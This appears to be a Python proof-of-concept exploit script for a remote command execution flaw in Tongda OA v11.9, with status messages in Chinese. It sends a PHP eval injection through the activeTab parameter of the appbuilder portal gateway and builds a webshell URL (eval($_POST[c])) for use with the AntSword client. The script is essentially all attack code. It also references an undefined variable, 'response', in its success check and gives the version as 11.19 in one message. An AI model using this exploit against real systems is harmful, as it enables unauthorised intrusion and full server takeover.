import time
import requests
import urllib3

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    exp_url=target_url+'/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage'
    shell_url=target_url+'general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[c]))%3B/*&id=19&module=Carouselimage'
    success_msg = now_time() + ' [SUCCESS]  存在通达OA11.19任意命令执行漏洞'
    shell_msg = now_time() + ' [SUCCESS]  漏洞连接蚁剑即可密码为c:{}'.format(shell_url)
    warning_msg = now_time() + ' [WARNING]  不存在通达OA v11.9 任意命令执行漏洞'
    error_msg = now_time() + ' [ERROR] [通达OA v11.9 任意命令执行漏洞] 未知错误，无法利用poc请求目标或被目标拒绝请求'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.get(exp_url, headers=headers, verify=False)        
        if upload.status_code == 200 and 'vuln_test' in response.text:
            return success_msg, shell_msg
        else:
            return warning_msg       
    except:
        return error_msg        
